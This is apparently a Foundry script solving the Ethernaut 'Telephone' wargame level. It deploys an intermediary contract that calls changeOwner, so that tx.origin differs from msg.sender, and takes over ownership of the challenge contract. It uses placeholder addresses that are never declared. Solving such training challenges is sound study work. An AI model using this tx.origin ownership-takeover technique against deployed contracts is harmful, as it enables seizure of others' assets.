// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/04_Telephone.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        TelephoneAttacker attacker = new TelephoneAttacker(your_challenge_address);    
        attacker.attack(myAddress);

        vm.stopBroadcast();
    }
}

contract TelephoneAttacker {
    Telephone public level04;
    
    constructor(address _target) {
        level04 = Telephone(_target);
    }
    
    function attack(address _newOwner) public {
        level04.changeOwner(_newOwner);
    }
}